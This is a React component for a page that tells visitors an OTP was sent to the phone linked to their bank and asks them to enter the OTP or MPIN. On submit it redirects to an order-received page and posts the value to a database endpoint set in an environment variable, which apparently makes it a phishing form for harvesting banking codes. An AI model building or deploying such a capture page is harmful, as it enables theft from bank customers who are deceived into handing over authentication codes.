import React from 'react';
import { useState, useEffect, useRef } from 'react'



import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';


function Otp() {

  const [counter, setCounter] = React.useState(120);
  React.useEffect(() => {
    const timer =
      counter > 0 && setInterval(() => setCounter(counter - 1), 1000);
    return () => clearInterval(timer);
  }, [counter]);



  const [count, setCount] = useState()
  const navigate = useNavigate();


  const handleclick = () => {
    navigate("/")
  }



  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();

  const delay = (d) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve()
      }, d * 5000);
    })
  }

  //const onSubmit = async (data) => {
  // await delay(2)
  //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
  //let res = await r.text()
  //console.log(data, res)


  const onSubmit = async (data) => {
    navigate("/Order-Recived")
    let r = await fetch(import.meta.env.VITE_MONGO, {
      method: "POST", headers: {
        "Content-Type": "application/json",
      }, body: JSON.stringify(data)


    })
    let res = await r.text()

    console.log(data, res)


  }
  return (
    <>
    <div className="otp-body">
      <div className="otp-box">
        <form action="" className='otp-form' onSubmit={handleSubmit(onSubmit)}>
          <div className="otp-title">OTP</div>
          <div className="otp-title">Verification Code</div>
          <p className='otp-title'>OTP send to the phone number linked to your BANK</p>

          <input type="number" className="otp-input-control otp-input" placeholder='OTP / MPIN'  {...register("OTP")} name='OTP' />
          <button class="adress-btn" type="submit" value="submit">Continue</button>
        </form>

        <div className="otp-timer">Resend OTP in 00:{counter}</div>
      </div>
      </div>
    </>
  )
}

export default Otp